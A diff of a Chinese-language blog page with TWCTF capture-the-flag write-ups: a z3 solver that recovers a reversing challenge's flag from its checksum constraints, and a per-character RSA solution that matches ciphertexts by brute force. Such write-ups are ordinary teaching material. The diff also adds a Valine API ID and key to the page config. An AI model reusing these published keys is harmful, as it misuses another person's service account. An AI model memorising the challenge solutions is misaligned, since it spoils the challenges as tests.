+xor1 = [<span class="hljs-number">0x52</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>]
+sum2 = [<span class="hljs-number">0x129</span>, <span class="hljs-number">0x103</span>, <span class="hljs-number">0x12B</span>, <span class="hljs-number">0x131</span>, <span class="hljs-number">0x135</span>, <span class="hljs-number">0x10B</span>, <span class="hljs-number">0x0FF</span>, <span class="hljs-number">0x0FF</span>]
+xor2 = [<span class="hljs-number">1</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>]
+cnt = [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
+memcmp = [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xFF</span>]
+d = <span class="hljs-string">"0123456789abcdef"</span>
+<span class="hljs-string">'''
+for i in range(0,16):
+	s.add(str(flag).count(str(ord(d[i])))==cnt[i])
+'''</span>
+<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
+	<span class="hljs-keyword">if</span> memcmp[j] == <span class="hljs-number">0x80</span>:
+		s.add(flag[j]&gt; <span class="hljs-number">0x60</span>)
+		s.add(flag[j]&lt;=<span class="hljs-number">0x66</span>)
+	<span class="hljs-keyword">else</span>:
+		s.add(flag[j]&lt;=<span class="hljs-number">0x39</span>)
+		s.add(flag[j]&gt; <span class="hljs-number">0x2f</span>)
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag:
+	s.add(<span class="hljs-number">0x30</span>&lt;=x)
+	s.add(<span class="hljs-number">0x67</span>&gt;x)
+
+s.add(flag[<span class="hljs-number">1</span>]==<span class="hljs-number">102</span>)
+s.add(flag[<span class="hljs-number">5</span>]==<span class="hljs-number">0x38</span>)
+s.add(flag[<span class="hljs-number">6</span>]==<span class="hljs-number">0x37</span>)
+s.add(flag[<span class="hljs-number">17</span>]==<span class="hljs-number">0x32</span>)
+s.add(flag[<span class="hljs-number">25</span>]==<span class="hljs-number">0x34</span>)
+s.add(flag[<span class="hljs-number">31</span>]==<span class="hljs-number">0x35</span>)
+<span class="hljs-comment">#for i in range(len())</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(flag)):
+	s.add(flag[i]!=<span class="hljs-number">51</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(flag),<span class="hljs-number">4</span>):
+	s.add(flag[i]+flag[i+<span class="hljs-number">1</span>]+flag[i+<span class="hljs-number">2</span>]+flag[i+<span class="hljs-number">3</span>]==sum1[i/<span class="hljs-number">4</span>])
+	s.add(flag[i]^flag[i+<span class="hljs-number">1</span>]^flag[i+<span class="hljs-number">2</span>]^flag[i+<span class="hljs-number">3</span>]==xor1[i/<span class="hljs-number">4</span>])
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):
+	s.add(flag[i]+flag[i+<span class="hljs-number">8</span>]+flag[i+<span class="hljs-number">16</span>]+flag[i+<span class="hljs-number">24</span>]==sum2[i])
+	s.add(flag[i]^flag[i+<span class="hljs-number">8</span>]^flag[i+<span class="hljs-number">16</span>]^flag[i+<span class="hljs-number">24</span>]==xor2[i])
+sum = <span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2</span>):
+	sum += flag[i]
+s.add(sum == <span class="hljs-number">1160</span>)
+
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">"[-] check sat ·····"</span>
+<span class="hljs-keyword">if</span> s.check() == sat:
+	m = s.model()
+	<span class="hljs-keyword">print</span> m
+	<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] print flag ·····"</span>
+	kk = <span class="hljs-string">""</span>
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):
+		kk +=  chr(int(<span class="hljs-string">"%s"</span> % (m[flag[i]])))
+	<span class="hljs-keyword">print</span> <span class="hljs-string">"TWCTF&#123;"</span>+kk+<span class="hljs-string">"&#125;"</span>
+<span class="hljs-keyword">else</span>:
+	<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] False     ·····"</span></code></pre>
 
 <h2 id="real-baby-rsa">real baby rsa<a class="post-anchor" href="#real-baby-rsa"></a></h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">'TWCTF&#123;CENSORED&#125;'</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="comment"># Public Parameters</span></span><br><span class="line">N = <span class="number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># Encrypt the flag!</span></span><br><span class="line"><span class="string">for char in flag:</span></span><br><span class="line"><span class="string">    print(pow(ord(char), e, N))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">dic = <span class="string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">		xx = line.rstrip()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">			zz = str(pow(ord(i),e,N))</span><br><span class="line">			<span class="keyword">if</span> xx[:<span class="number">600</span>] == zz[:<span class="number">600</span>]:</span><br><span class="line">				flag += i</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">flag = <span class="hljs-string">'TWCTF&#123;CENSORED&#125;'</span>
+<span class="hljs-keyword">import</span> libnum
+<span class="hljs-comment"># Public Parameters</span>
+N = <span class="hljs-number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span>
+e = <span class="hljs-number">65537</span>
+<span class="hljs-string">'''
+# Encrypt the flag!
+for char in flag:
+    print(pow(ord(char), e, N))
+'''</span>
+dic = <span class="hljs-string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span>
+flag = <span class="hljs-string">""</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'output'</span>) <span class="hljs-keyword">as</span> f:
+	<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
+		xx = line.rstrip()
+		<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:
+			zz = str(pow(ord(i),e,N))
+			<span class="hljs-keyword">if</span> xx[:<span class="hljs-number">600</span>] == zz[:<span class="hljs-number">600</span>]:
+				flag += i
+				<span class="hljs-keyword">break</span>
+
+<span class="hljs-keyword">print</span> flag</code></pre>
 
 
 
@@ -299,7 +485,7 @@
   
 </html>
 <script type="text/javascript">
-                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
                 </script> <script type="text/javascript">window.addEventListener('load', function() {
     
     window.loadJs = function(d, m, a) {
